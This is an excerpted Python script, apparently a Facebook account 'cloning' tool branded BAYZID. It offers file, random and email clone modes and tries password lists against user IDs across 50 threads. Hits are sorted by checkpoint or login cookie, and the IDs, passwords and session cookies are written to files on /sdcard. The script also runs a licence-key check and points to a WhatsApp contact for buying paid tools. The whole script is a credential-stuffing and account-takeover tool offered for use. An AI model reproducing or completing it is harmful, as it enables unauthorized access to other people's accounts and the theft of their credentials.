...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[BAYZID-XD')
...
def menu():
	...
	_BAYZID_(f'\033[1;92m[\033[1;34m1\033[1;92m] FILE CLONE')

	_BAYZID_(f'\033[1;92m[\033[1;92m\033[1;34m2\033[1;92m] RANDOM CLONE')

	_BAYZID_(f'\033[1;92m[\033[1;92m\033[1;34m3\033[1;92m] EMAIL CLONE')

	_BAYZID_(f'[\033[1;92m\033[1;34m4\033[1;92m] CONTACT ME')

	_BAYZID_(f'\033[1;92m[\033[1;34m0\033[1;92m]\033[0;91m EXIT')

	_____BAYZID_____ = input('\033[1;92m[\033[1;34mðŸ™‚\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')

	if _____BAYZID_____ in ['1']:

		C1()

	if _____BAYZID_____ in ['2']:

		Y2()

	if _____BAYZID_____ in ['3']:

		BER()

	if _____BAYZID_____ in ['4']:

		os.system("xdg-open https://www.facebook.com/profile.php?id=100000448332183")

	if _____BAYZID_____ in ['0']:
...
def passwrd():
	...
	#print(f"\033[1;92m[\033[1;92m\033[1;31m\033[1;92m] YOUR NAME      \033[1;34m: \033[0;92m"+str(BAYZID_NAME))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [BAYZID] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r\x1b[1;91m [\033[1;91mBAYZID-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
				...
				print(f'\r\x1b[1;92m [\033[1;92mBAYZID-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')

				cek_apk(session,coki)

				open('/sdcard/BAYZID-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
...
def Y2():
    ...
    with ThreadPool(max_workers=50) as BAYZID:
        ...
        for love in user:
            ...
            BAYZID.submit(BAYZID,uid,pwv,tl)
    ...
    try:
        ...
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    print('\033[1;92m[\033[1;92mBAYZID-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))

        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')

        	    cek_apk(session,coki)

        	    open('/sdcard/BAYZID-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        ...
        sys.stdout.write('\r%s[BAYZID-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
...
def mex():
    ...
    try:
        ...
        os.system('am start https://wa.me/+8801886653082?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20BAYZID%20Paid%20Tools.%20My%20Key:%20'+key1)

        mex()

    r = requests.get('https://raw.githubusercontent.com/MrBAYZID156/approved.txt/main/approved.%20txt').text
